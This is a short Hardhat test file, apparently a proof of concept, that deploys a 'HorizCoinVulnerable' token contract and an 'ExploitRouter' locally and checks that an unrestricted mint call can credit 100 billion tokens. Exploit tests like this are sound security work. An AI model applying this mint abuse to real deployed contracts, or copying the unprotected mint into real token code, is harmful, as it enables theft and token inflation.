const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Exploit", function () {
  it("should mint 100B tokens", async function () {
    const HZC = await ethers.getContractFactory("HorizCoinVulnerable");
    const hzc = await HZC.deploy();
    await hzc.waitForDeployment();

    const Router = await ethers.getContractFactory("ExploitRouter");
    const router = await Router.deploy(ethers.ZeroAddress);
    await router.waitForDeployment();

    await hzc.mint(router.getAddress(), ethers.parseEther("100000000000"));
    expect(await hzc.balanceOf(router.getAddress())).to.equal(ethers.parseEther("100000000000"));
  });
});
